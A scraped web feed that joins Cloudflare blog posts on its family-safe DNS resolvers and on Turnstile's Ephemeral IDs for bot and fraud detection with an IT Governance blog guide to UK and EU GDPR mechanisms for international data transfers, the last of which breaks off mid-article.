our DNS resolvers for free. Internet service, network, and hardware equipment providers can sign up and join this program to partner with Cloudflare to deliver a safer browsing experience that is easy to use, industry leading, and &lt;b&gt;at no cost to anyone&lt;/b&gt;.&lt;/p&gt;&lt;p&gt;Leading companies have already partnered with Cloudflare to deliver superior and customized offerings to protect their customers. By delivering this service in a place where the customer is familiar, you can help us make the Internet a safe place for all. &lt;/p&gt;
          &lt;div&gt;

          &lt;p&gt;COVID-19 presented new challenges beginning in 2020 as kids' online activity increased and the reliance on home networks was more present than ever before. Research shows around &lt;a href="https://www.pewresearch.org/internet/2020/07/28/childrens-engagement-with-digital-devices-screen-time/"&gt;&lt;u&gt;67% of adolescents&lt;/u&gt;&lt;/a&gt; have access to a tablet, with ages as low as two years old accessing media content. While it is often impressive to watch the ease with which a young child can navigate a smartphone or tablet handed to them and pull up their favorite YouTube show, it becomes increasingly concerning that kids may unintentionally stumble onto harmful content in the process.&lt;/p&gt;&lt;p&gt;Our launch of 1.1.1.1 for Families in 2020 provided that peace of mind to users around the globe, and it continues to deliver those protections. Today, households can set up this service using our &lt;a href="https://developers.cloudflare.com/1.1.1.1/setup/"&gt;&lt;u&gt;guide&lt;/u&gt;&lt;/a&gt;. They can select the DNS resolver they want to use, focusing on just privacy, or include blocking security threats and adult content across their entire home network.&lt;/p&gt;
            &lt;figure&gt;
            
            &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/49EwOARWEuv8TfdzKdWpkc/bf53e440a69ae924ec09d806586ef567/image3.png" /&gt;
            
            &lt;/figure&gt;&lt;p&gt;Although this service is available and free for anyone to use, there are still many users who browse online daily without protections in place. Setting up protection like this can feel daunting, and many users are at a loss on where to begin and/or how to configure this on their devices or home network. Today we are announcing a partnership that will make setup and configuration much easier for users.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Partnering to extend security even further &lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#partnering-to-extend-security-even-further"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;ISPs and network providers can use Cloudflare’s different resolver services to provide various offerings to their customers. Our existing partners have taken these offerings and built them into their platforms as an extension of the services that they are already providing to their customers. This built-in model allows for easy adoption and a consistent and comprehensive end customer journey. Each service is designed with a specific purpose in mind, outlined below:&lt;/p&gt;&lt;p&gt;&lt;b&gt;Our core privacy resolver (1.1.1.1)&lt;/b&gt; is designed for speed and privacy.  Additionally, DNS requests to our public resolver can be sent over a secure channel using &lt;a href="https://developers.cloudflare.com/1.1.1.1/encryption/dns-over-https/"&gt;&lt;u&gt;DNS over HTTPS (DoH)&lt;/u&gt;&lt;/a&gt; or &lt;a href="https://developers.cloudflare.com/1.1.1.1/encryption/dns-over-tls/"&gt;&lt;u&gt;DNS over TLS (DoT)&lt;/u&gt;&lt;/a&gt;, significantly decreasing the odds of any unwanted spying or monster-in-the-middle attacks.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Our security resolver (1.1.1.2)&lt;/b&gt; has all the benefits of 1.1.1.1, with the additional benefit of protecting users from sites that contain malware, spam, botnet command and control attacks, or phishing threats.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Our family resolver (1.1.1.3)&lt;/b&gt; provides all the benefits of 1.1.1.2, with the additional benefit of blocking unwanted adult content from both direct site navigation, as well as locking public search engines to Safe Search only. This prevents anyone from unknowingly searching for something that might return an unwanted result. &lt;/p&gt;
          &lt;div&gt;

            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;If users want even more flexibility than what our public DNS resolvers provide, Cloudflare also offers a Gateway product that allows customized filtering, reporting, logging, analytics, and scheduling. This advanced &lt;a href="https://www.cloudflare.com/lp/ppc/cloudflare-gateway-x/?utm_source=google&amp;amp;utm_medium=cpc&amp;amp;utm_campaign=ao-fy-acq-namer_en_na-umbrella-ge-ge-prospecting-sch_g_brand_alpha&amp;amp;utm_content=Alpha_Brand_ZeroTrust_Gateway&amp;amp;utm_term=cloudflare+gateway&amp;amp;campaignid=71700000110566648&amp;amp;adgroupid=58700008395369395&amp;amp;creativeid=669303241127&amp;amp;&amp;amp;_bt=669303241127&amp;amp;_bk=cloudflare%20gateway&amp;amp;_bm=p&amp;amp;_bn=g&amp;amp;_bg=152212903387&amp;amp;_placement=&amp;amp;_target=&amp;amp;_loc=9194681&amp;amp;_dv=c&amp;amp;awsearchcpc=1&amp;amp;gad_source=1&amp;amp;gclid=CjwKCAjw5qC2BhB8EiwAvqa41kCNIRA_o0KDeWYAgS3YmHunP3DCtEEkHlHM-lzAe02tb5kOLvdhVxoCFAUQAvD_BwE&amp;amp;gclsrc=aw.ds"&gt;&lt;u&gt;Gateway&lt;/u&gt;&lt;/a&gt; offering includes over &lt;a href="https://developers.cloudflare.com/cloudflare-one/policies/gateway/domain-categories/"&gt;&lt;u&gt;114 categories&lt;/u&gt;&lt;/a&gt; ranging from social media, online messaging platforms, gaming, and &lt;a href="https://developers.cloudflare.com/cloudflare-one/policies/gateway/dns-policies/#safe-search"&gt;&lt;u&gt;“safe search” results&lt;/u&gt;&lt;/a&gt;, all the way to “home &amp;amp; garden”.&lt;/p&gt;&lt;p&gt;The additional filters and scheduling functionality empowers users to exercise more nuanced and time-based controls, such as limiting social media during school hours or dinner time. &lt;/p&gt;&lt;p&gt;If you are an ISP or equipment manufacturer looking to provide easily customizable options for your customers, this is also an available option. We have a multi-tenant environment available for our Gateway offering that enables our customers to empower their individual subscribers to configure their own individual filters for their users and homes. If you are a device manufacturer or ISP looking to offer customizable protections for your individual subscribers, this may be a good option for you.&lt;/p&gt;

Introducing Ephemeral IDs — a new dimension in detecting fraudulent activity, bot or human, that links behavior to a specific client instead of an IP address. This makes Turnstile better for everyone, everywhere.</description><content:encoded>&lt;p&gt;In the early days of the Internet, a single IP address was a reliable indicator of a single user. However, today’s Internet is more complex. Shared IP addresses are now common, with users connecting via mobile IP address pools, VPNs, or behind &lt;a href="https://en.wikipedia.org/wiki/Carrier-grade_NAT"&gt;&lt;u&gt;CGNAT (Carrier Grade Network Address Translation)&lt;/u&gt;&lt;/a&gt;. This makes relying on IP addresses alone a weak method to combat modern threats like automated attacks and fraudulent activity. Additionally, many Internet users have no option but to use an IP address which they don’t have sole control over, and as such, &lt;a href="https://blog.cloudflare.com/consequences-of-ip-blocking/"&gt;&lt;u&gt;should not be penalized for that&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;At Cloudflare, we are solving this complexity with &lt;a href="https://developers.cloudflare.com/turnstile/"&gt;&lt;u&gt;Turnstile&lt;/u&gt;&lt;/a&gt;, our &lt;a href="https://blog.cloudflare.com/turnstile-private-captcha-alternative/"&gt;&lt;u&gt;CAPTCHA alternative&lt;/u&gt;&lt;/a&gt;. And now, we’re taking the next step in advancing security with Ephemeral IDs, a new feature that generates a unique short-lived ID, without relying on any network-level information.&lt;/p&gt;&lt;p&gt;When a website visitor interacts with Turnstile, we now calculate an Ephemeral ID that can link behavior to a specific client instead of an IP address. This means that even when attackers rotate through large pools of IP addresses, we can still identify and block malicious actions. For example, in attacks like &lt;a href="https://www.cloudflare.com/learning/bots/what-is-credential-stuffing/"&gt;&lt;u&gt;credential stuffing&lt;/u&gt;&lt;/a&gt; or account signups, where fraudsters attempt to disguise themselves using different IP addresses, Ephemeral IDs allow us to detect abuse patterns more accurately beyond just determining whether the visitor is a human or a bot. Multiple fraudulent actions from the same client are grouped together, improving our detection rate while reducing false positives.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;How Ephemeral IDs work&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#how-ephemeral-ids-work"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Turnstile detects bots by analyzing browser attributes and signals. Using these aggregated client-side signals, we generate a short-lived Ephemeral ID without setting any cookies or using similar client-side storage. These IDs are intentionally not 100% unique and have a brief lifespan, making them highly effective in identifying patterns of fraud and abuse, without compromising user privacy.&lt;/p&gt;&lt;p&gt;When the same visitor interacts with Turnstile widgets from different Cloudflare customers, they receive different Ephemeral IDs for each one. Additionally, because these IDs change frequently, they cannot be used to track a single visitor over multiple days.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/2uGotegS95KA9Ea5qRsQgs/71f01ce9c9a8096e7c64cdfc470ddeb0/BLOG-2548_2.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sub&gt;&lt;i&gt;Blue: A single IP address | Green: A single Ephemeral ID&lt;/i&gt;&lt;/sub&gt;&lt;sub&gt;
&lt;/sub&gt;&lt;sub&gt;&lt;i&gt;The bigger the node, the more frequently seen that ID or IP address was in our dataset.&lt;/i&gt;&lt;/sub&gt;&lt;/p&gt;&lt;p&gt;The graphic above illustrates the complex reality of the modern Internet, where the relationship between clients and IP addresses is far from a simple one-to-one mapping. While some straightforward mappings still exist, they are no longer the norm.&lt;/p&gt;&lt;p&gt;During a period where a site or service is under attack, we observe a “nest” of highly correlated Ephemeral IDs. In the example below, the correlation is based on both Ephemeral ID and IP address.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5Rk4QXW1nkrrIk46XgzXdA/52739f21e6a00643a511de77b47142f1/BLOG-2548_3.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sub&gt;&lt;i&gt;Nest in the center of the diagram visualizes thousands of IP addresses (blue) which are correlated by the commonly identified Ephemeral IDs (green). The bigger the node, the more frequently seen that ID or IP address was in our dataset.&lt;/i&gt;&lt;/sub&gt;&lt;/p&gt;&lt;p&gt;This is real-world data showing fraudulent activity on one of Cloudflare’s public-facing forms. Even with access to a broad range of IP addresses, attackers struggle to completely disguise their requests because Ephemeral IDs are generated based on patterns beyond IP addresses. This means that even if they rotate addresses, the underlying client characteristics are still detected, making it harder for them to evade our security measures. This makes it easier for us to group these requests and apply appropriate business logic, whether that means discarding the requests, requiring further validation, enforcing &lt;a href="https://www.cloudflare.com/learning/access-management/what-is-multi-factor-authentication/"&gt;&lt;u&gt;multi-factor authentication (MFA)&lt;/u&gt;&lt;/a&gt;, or other actions. &lt;/p&gt;&lt;p&gt;This new client identification technology seamlessly integrates into the broader advancements we’ve made to Turnstile over the past year. Whether you’re protecting &lt;a href="https://developers.cloudflare.com/turnstile/tutorials/login-pages/"&gt;&lt;u&gt;login forms&lt;/u&gt;&lt;/a&gt;, signup pages, or high value transactions, you’ll immediately benefit from this extra layer of abuse detection &lt;b&gt;without needing to change a single line of code&lt;/b&gt;. We’ll take care of all the heavy lifting and analysis behind the scenes, and our system will continue to improve its accuracy and effectiveness over time.&lt;/p&gt;&lt;p&gt;What does this mean for you? Starting today, &lt;a href="https://www.cloudflare.com/products/turnstile/"&gt;&lt;u&gt;Turnstile&lt;/u&gt;&lt;/a&gt; will go beyond just identifying bots. &lt;b&gt;All&lt;/b&gt; &lt;b&gt;websites protected by Turnstile will automatically benefit&lt;/b&gt; from the integration of Ephemeral IDs into our detection logic. This means we can more effectively identify and penalize offending clients without impacting other users on the same network, or IP address, improving security and user experience for everyone.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Ephemeral IDs in action&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#ephemeral-ids-in-action"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Everyone benefits from the addition of Ephemeral IDs to the Challenge Platform, but for those who want to use it beyond that, the Ephemeral ID is available through the Turnstile &lt;a href="https://developers.cloudflare.com/turnstile/get-started/server-side-validation/"&gt;&lt;u&gt;siteverify&lt;/u&gt;&lt;/a&gt; response. A practical use case for Ephemeral IDs is preventing fraudulent account signups. Imagine a bad actor, a real person using a real device, creating hundreds of fake accounts while rotating IP addresses to avoid detection. By ingesting Ephemeral IDs and logging them alongside your account creation logs, you can set up alerts based on account creation thresholds in real-time or retroactively investigate suspicious activity. Even though Ephemeral IDs are short-lived and may have changed by the time an investigation begins, they still provide valuable insights through aggregate analysis, and provide an extra dimension to identify fraud and abuse.&lt;/p&gt;&lt;p&gt;For our &lt;b&gt;Turnstile Enterprise &lt;/b&gt;and&lt;b&gt; Bot Management Enterprise &lt;/b&gt;customers, you now have the option to access Ephemeral IDs directly through the Turnstile siteverify response. Get in touch with your Account Executive to enable it on your account.&lt;/p&gt;&lt;p&gt;Below is an example of &lt;a href="https://developers.cloudflare.com/turnstile/get-started/server-side-validation/"&gt;&lt;u&gt;siteverify&lt;/u&gt;&lt;/a&gt; response for those who have enabled Ephemeral IDs.&lt;/p&gt;

&lt;p&gt;The &lt;a href="https://www.itgovernance.co.uk/data-protection-dpa-and-eu-data-protection-regulation" rel="noreferrer noopener" target="_blank"&gt;UK GDPR (General Data Protection Regulation)&lt;/a&gt; offers a high standard of data protection – but its scope is limited to organisations based or operating in the UK.&lt;/p&gt;



&lt;p&gt;So, what happens if you transfer the personal data outside the country?&lt;/p&gt;



&lt;p&gt;The GDPR requires UK residents’ data to be offered the &lt;em&gt;same&lt;/em&gt; level of protection, whether processed at home or abroad.&lt;/p&gt;



&lt;p&gt;How? By demanding that organisations put adequate safeguards in place for ‘restricted transfers’ of personal data.&lt;/p&gt;



&lt;p&gt;This blog explains what restricted transfers are, and the safeguards you’re allowed to rely on under the UK GDPR. I’ll also touch on the EU GDPR, where appropriate.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;In this guide&lt;/h2&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#restricted-transfer"&gt;What restricted transfers are&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Mechanism-1"&gt;Mechanism #1: Adequacy decisions&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Mechanism-2"&gt;Mechanism #2: IDTA (international data transfer agreement)&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Mechanism-3"&gt;Mechanism #3: BCRs (binding corporate rules)&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Mechanism-4"&gt;Mechanism #4: Codes of conduct&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Mechanism-5"&gt;Mechanism #5: Certification&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Mechanism-6"&gt;Mechanism #6: Derogations&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Mechanism-7"&gt;Mechanism #7: Compelling legitimate interest&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#how-to-choose"&gt;How to choose the right mechanism&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="restricted-transfer"&gt;What is a ‘restricted transfer’ under the UK GDPR?&lt;/h2&gt;



&lt;p&gt;To send personal data outside the UK – i.e. to make a ‘restricted transfer’ – data controllers and processors must provide an adequate level of security to protect:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The personal data being processed; and&lt;/li&gt;



&lt;li&gt;The rights and freedoms of data subjects.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Organisations subject to the UK GDPR must also consider relevant laws of the countries involved, and prevent the personal data from being accessed by other entities* without the data subject’s knowledge.&lt;/p&gt;



&lt;p&gt;There are three conditions for the transfer to be considered ‘restricted’ under the UK GDPR:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;The personal data you want to transfer is subject to the UK GDPR.&lt;/li&gt;



&lt;li&gt;You’re initiating and agreeing to send personal data to (or make it available to) a recipient outside the UK.&lt;/li&gt;



&lt;li&gt;The recipient is a separate, legally distinct organisation (or individual) from you.&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;Restricted transfers can include Cloud storage, automated systems for data processing, and even analytics providers.&lt;/p&gt;



&lt;p&gt;&lt;em&gt;*These ‘other entities’ include law enforcement agencies, which are more prone to accessing people’s data under local national laws. For example, the FBI uses FISA Section 702 to collect ‘foreign intelligence information’ from non-US residents.&lt;/em&gt;&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;How different is that from the EU GDPR?&lt;/h3&gt;



&lt;p&gt;The requirements are broadly the same, but looking at it from an EEA rather than a UK perspective:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The data controller/processor linked to processing activity is subject to the EU GDPR.&lt;/li&gt;



&lt;li&gt;The controller/processor transfers the data, or makes it available to, another organisation.&lt;/li&gt;



&lt;li&gt;That organisation is outside the EEA, or it’s an international organisation.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Let’s look at seven mechanisms for international personal data transfers under the UK and, where applicable, EU GDPR.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Mechanism-1"&gt;Mechanism #1: Adequacy decisions&lt;/h2&gt;



&lt;p&gt;Relying on an &lt;strong&gt;adequacy decision&lt;/strong&gt; is usually the easiest safeguard to rely on for international transfers.&lt;/p&gt;



&lt;p&gt;The UK’s &lt;strong&gt;adequacy regulations&lt;/strong&gt; grant countries or territories deemed to provide ‘adequate’ protection to personal data, and to data subjects’ rights and freedoms, an adequacy decision.&lt;/p&gt;



&lt;p&gt;That means personal data may flow freely between the UK and these ‘adequate’ countries. The EU GDPR offers an equivalent mechanism under Article 45 (‘transfers on the basis of an adequacy decision’).&lt;/p&gt;



&lt;p&gt;Under the UK GDPR’s adequacy regulations, the EEA and all countries with an adequacy decision under the EU GDPR are covered. These are:&lt;/p&gt;



&lt;ul class="wp-block-list multi-column"&gt;
&lt;li&gt;Andorra&lt;/li&gt;



&lt;li&gt;Argentina&lt;/li&gt;



&lt;li&gt;Austria&lt;/li&gt;



&lt;li&gt;Belgium&lt;/li&gt;



&lt;li&gt;Bulgaria&lt;/li&gt;



&lt;li&gt;Croatia&lt;/li&gt;



&lt;li&gt;Cyprus&lt;/li&gt;



&lt;li&gt;Czech Republic&lt;/li&gt;



&lt;li&gt;Denmark&lt;/li&gt;



&lt;li&gt;Estonia&lt;/li&gt;



&lt;li&gt;Faroe Islands&lt;/li&gt;



&lt;li&gt;Finland&lt;/li&gt;



&lt;li&gt;France&lt;/li&gt;



&lt;li&gt;Germany&lt;/li&gt;



&lt;li&gt;Gibraltar&lt;/li&gt;



&lt;li&gt;Greece&lt;/li&gt;



&lt;li&gt;Guernsey&lt;/li&gt;



&lt;li&gt;Hungary&lt;/li&gt;



&lt;li&gt;Iceland&lt;/li&gt;



&lt;li&gt;Ireland&lt;/li&gt;



&lt;li&gt;Isle of Man&lt;/li&gt;



&lt;li&gt;Israel&lt;/li&gt;



&lt;li&gt;Italy&lt;/li&gt;



&lt;li&gt;Jersey&lt;/li&gt;



&lt;li&gt;Latvia&lt;/li&gt;



&lt;li&gt;Liechtenstein&lt;/li&gt;



&lt;li&gt;Lithuania&lt;/li&gt;



&lt;li&gt;Luxembourg&lt;/li&gt;



&lt;li&gt;Malta&lt;/li&gt;



&lt;li&gt;Netherlands&lt;/li&gt;



&lt;li&gt;New Zealand&lt;/li&gt;



&lt;li&gt;Norway&lt;/li&gt;



&lt;li&gt;Poland&lt;/li&gt;



&lt;li&gt;Portugal&lt;/li&gt;



&lt;li&gt;Romania&lt;/li&gt;



&lt;li&gt;Slovakia&lt;/li&gt;



&lt;li&gt;Slovenia&lt;/li&gt;



&lt;li&gt;South Korea&lt;/li&gt;



&lt;li&gt;Spain&lt;/li&gt;



&lt;li&gt;Sweden&lt;/li&gt;



&lt;li&gt;Switzerland&lt;/li&gt;



&lt;li&gt;Uruguay&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;In addition, Canada, Japan and the &lt;a href="https://www.itgovernance.co.uk/blog/expert-insight-andrew-snow" rel="noreferrer noopener" target="_blank"&gt;US&lt;/a&gt; have received partial adequacy decisions under both the UK and EU GDPR.&lt;/p&gt;



&lt;p&gt;Also note that personal data can flow freely between public authorities internationally.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;What about Brexit?&lt;/h3&gt;



&lt;p&gt;When it comes to international transfers, we’ve only seen one meaningful change in recent years: &lt;a href="https://www.itgovernance.co.uk/blog/expert-insight-andrew-snow" rel="noreferrer noopener" target="_blank"&gt;Schrems II&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;Though there &lt;em&gt;are&lt;/em&gt; differences between the UK and EU GDPR, of course, for transfers to third countries, little has changed because of the mutual adequacy decision.&lt;/p&gt;



&lt;p&gt;Put differently, personal data may flow freely between the UK and EU/EEA. And since the remaining countries with adequacy decisions are identical for the UK and EU GDPR, little has changed.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Mechanism-2"&gt;Mechanism #2: International data transfer agreement&lt;/h2&gt;



&lt;p&gt;Under the EU GDPR, we had the SCCs (standard contractual clauses). After the EU updated them, the UK ICO (Information Commissioner’s Office) updated its equivalent mechanism to the &lt;strong&gt;IDTA: international data transfer agreement&lt;/strong&gt;.&lt;/p&gt;



&lt;p&gt;Organisations subject to the UK GDPR must now use the IDTA, as the transition period ended in March 2024.&lt;/p&gt;



&lt;p&gt;The idea for both the EU SCCs and UK IDTA is that they’re model contractual clauses, available on the &lt;a href="https://commission.europa.eu/law/law-topic/data-protection/international-dimension-data-protection/standard-contractual-clauses-scc_en" rel="noreferrer noopener" target="_blank"&gt;European Commission&lt;/a&gt; and &lt;a href="https://ico.org.uk/for-organisations/uk-gdpr-guidance-and-resources/international-transfers/international-data-transfer-agreement-and-guidance/" rel="noreferrer noopener" target="_blank"&gt;ICO&lt;/a&gt; websites respectively. If you use them without change, they should comply with the &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-article-28-contracts-what-you-need-to-know" rel="noreferrer noopener" target="_blank"&gt;Article 28 requirements&lt;/a&gt; of the EU and UK GDPR.&lt;/p&gt;



&lt;p&gt;More specifically, you complete the first 8 pages the IDTA. The remaining 28 pages are all the mandatory clauses you cannot amend nor remove.&lt;/p&gt;



&lt;p&gt;You &lt;em&gt;can&lt;/em&gt;, however, add more clauses, but these may not change or take away from the meaning of the pre-written text.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;Remember the transfer risk assessment tool!&lt;/h3&gt;



&lt;p&gt;Many people overlook the TRA (transfer risk assessment) tool – a 41-page risk assessment also on the &lt;a href="https://ico.org.uk/for-organisations/uk-gdpr-guidance-and-resources/international-transfers/international-data-transfer-agreement-and-guidance/" rel="noreferrer noopener" target="_blank"&gt;ICO website&lt;/a&gt; – which sits alongside the IDTA.&lt;/p&gt;



&lt;p&gt;This TRA is designed to tell you whether you can go ahead with the international transfer of personal data in question.&lt;/p&gt;



&lt;p&gt;Like any other &lt;a href="https://www.itgovernance.co.uk/blog/why-risk-assessments-are-essential-for-gdpr-compliance." rel="noreferrer noopener" target="_blank"&gt;risk assessment&lt;/a&gt;, you must determine the level of risk, and decide whether it’s acceptable as-is, or requires treatment to bring it down to an acceptable level. You must also include them on your risk register.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Mechanism-3"&gt;Mechanism #3: Binding corporate rules&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;BCRs (binding corporate rules) &lt;/strong&gt;under both the UK and EU GDPR are for international organisations.&lt;/p&gt;



&lt;p&gt;Suppose you have offices in the UK, Australia and mainland China. If you took the IDTA/SCC approach here, you’d need &lt;em&gt;six&lt;/em&gt; contracts (and risk assessments), just to have the free flow of personal data between all entities.&lt;/p&gt;



&lt;p&gt;That’s where the BCRs come in. These rules allow all entities involved within a global organisation to have data flow freely between all entities within it.&lt;/p&gt;



&lt;p&gt;In effect, the BCRs are a contract that, like the IDTA, covers the requirements of Article 28, but the ICO (or, for the EU GDPR, your supervisory authority) must sign it off. &lt;a href="https://ico.org.uk/for-organisations/uk-gdpr-guidance-and-resources/international-transfers/guide-to-binding-corporate-rules/a-uk-bcr-addendum/" rel="noreferrer noopener" target="_blank"&gt;Its website&lt;/a&gt; has more information about the application process.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;That’s for the GDPR. What about international privacy laws?&lt;/h3&gt;



&lt;p&gt;Using my earlier example again, Australia and mainland China each have their own national laws, as do most countries around the world. So, your BCRs must reference the Australian Privacy Act and the Chinese Personal Information Protection Law.&lt;/p&gt;



&lt;p&gt;However, when dealing with international organisations, you &lt;em&gt;can&lt;/em&gt; get complications on the other (non-UK/EU) side.&lt;/p&gt;



&lt;p&gt;For example, I remember doing some GDPR work for a large Saudi Arabian organisation. A national law prevented it from being allowed to report data breaches with a risk to data subjects outside the country.&lt;/p&gt;



&lt;p&gt;For clarity: it may &lt;a href="https://www.itgovernance.co.uk/green-papers/data-breach-survival-guide" rel="noreferrer noopener" target="_blank"&gt;report data breaches&lt;/a&gt; to the local authorities, but not internationally. And where you have competing laws, the strictest always applies.&lt;/p&gt;



&lt;p&gt;When dealing with a situation like that, you need to find a workaround – for example, publish a statement your website like: ‘Please be aware that you might want to change your password at your earliest opportunity.’&lt;/p&gt;



&lt;p&gt;It’s not ideal, but it makes the best of an awkward situation. It’s taking a risk-based approach to compliance.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Mechanism-4"&gt;Mechanism #4: Codes of conduct&lt;/h2&gt;



&lt;p&gt;Under Article 40 of both GDPRs, organisations can rely on approved &lt;strong&gt;codes of conduct&lt;/strong&gt; to transfer data internationally. However, the UK doesn’t currently have any, so can’t use them.&lt;/p&gt;



&lt;p&gt;The EU, on the other hand, has multiple Article 40 codes of conduct available for certain types of data processing, within certain third countries.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Mechanism-5"&gt;Mechanism #5: Certification&lt;/h2&gt;



&lt;p&gt;Another provision under Article 42 of both GDPRs is &lt;strong&gt;certification&lt;/strong&gt;.&lt;/p&gt;



&lt;p&gt;The UK has several certification schemes. However, the only one approved under Article 42 that can also be used for international transfers is &lt;a href="https://ico.org.uk/for-organisations/advice-and-services/certification-schemes/certification-scheme-register/adisa-ict-asset-recovery-certification-80/" rel="noreferrer noopener" target="_blank"&gt;ADISA ICT Asset Recovery Certification 8.0&lt;/a&gt;. Furthermore, this scheme is only available to processors or sub-processors providing data sanitisation services.&lt;/p&gt;



&lt;p&gt;The EU GDPR currently has &lt;a href="https://www.itgovernance.co.uk/europrivacy" rel="noreferrer noopener" target="_blank"&gt;Europrivacy&lt;img alt="™" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/2122.png" style="height: 1em;" /&gt;&lt;sup&gt;/&lt;/sup&gt;®&lt;/a&gt;, but this certification mechanism currently doesn’t account for international transfers, and can’t be used outside the EU or EEA.&lt;/p&gt;



&lt;p&gt;However, Europrivacy is currently being extended to meet the Article 46(2)(f) requirements of the EU GDPR as an approved mechanism for international transfers.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Mechanism-6"&gt;Mechanism #6: International data transfer derogations&lt;/h2&gt;



&lt;p&gt;Article 49 of the UK and EU GDPR allow “&lt;strong&gt;derogations for specific situations&lt;/strong&gt;”. You should only rely on this mechanism if you can’t rely on any of the above.&lt;/p&gt;



&lt;p&gt;The derogations permit you to make restricted transfers if:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The data subject has explicitly consented;&lt;/li&gt;



&lt;li&gt;The transfer is necessary to perform a contract;&lt;/li&gt;



&lt;li&gt;The transfer is necessary to protect someone’s vital interests;&lt;/li&gt;



&lt;li&gt;The transfer is necessary for “important reasons of public interest”;&lt;/li&gt;



&lt;li&gt;The transfer is necessary to establish, exercise or defend legal claims; or&lt;/li&gt;



&lt;li&gt;You’re making the transfer from a register intended to provide information to the public.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;These types of transfers should be infrequent and concern a limited number of data subjects.&lt;/p&gt;



&lt;p&gt;Also, if you rely on a derogation, make sure you record (in your &lt;a href="https://www.itgovernance.co.uk/blog/records-of-processing-activities-ropas-simplifying-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;Article 30 ROPAs&lt;/a&gt;) the safeguards you’ve put in place for the data transfer.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Mechanism-7"&gt;Mechanism #7: Compelling legitimate interest&lt;/h2&gt;



